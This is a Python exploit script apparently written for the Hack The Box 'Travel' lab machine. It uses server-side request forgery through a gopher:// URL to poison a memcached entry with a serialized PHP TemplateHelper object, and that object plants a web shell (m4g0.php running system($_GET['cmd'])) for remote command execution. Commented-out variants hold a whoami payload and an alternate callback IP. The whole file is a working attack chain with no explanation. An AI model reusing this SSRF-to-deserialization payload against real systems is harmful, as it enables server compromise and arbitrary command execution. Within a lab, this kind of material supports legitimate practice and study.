import requests
import urllib.parse
import hashlib

#cmd = "prefix=xct_"


#cmd = """get xct_prueba"""
#object = """O:14:"TemplateHelper":2:{s:20:"TemplateHelperfile";s:8:"m4g0.php";s:20:"TemplateHelperdata";s:26:"<?php system('whoami'); ?>";}"""

object = """O:14:"TemplateHelper":2:{s:20:"TemplateHelperfile";s:8:"m4g0.php";s:20:"TemplateHelperdata";s:32:"<?php system($_GET[\"cmd\"]); ?>";}"""

#object = hashlib.md5(object.encode()).hexdigest()

#cmd = f"""\r\nset xct_mago 4 0 138\r\n{object}\r\n"""

# El hash: echo -n "$(echo -n 'http://www.travel.htb/newsfeed/customfeed.xml' | md5sum | cut -d' ' -f1):spc" | md5sum
# La longitud es 101 cambia en funcion a como modifiques tu payload
cmd = """\r\nset xct_4e5612ba079c530a6b1f148c0b352241 4 0 101\r\nO:14:"TemplateHelper":2:{s:4:"file";s:8:"m4g0.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}\r\n"""

cmd = urllib.parse.quote(cmd)

#cmd = urllib.parse.quote(cmd)

#url = "http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://10.10.14.35:11222/_" + cmd

url = "http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://2130706433:11211/_" + cmd

r = requests.get(url)

print(r.text)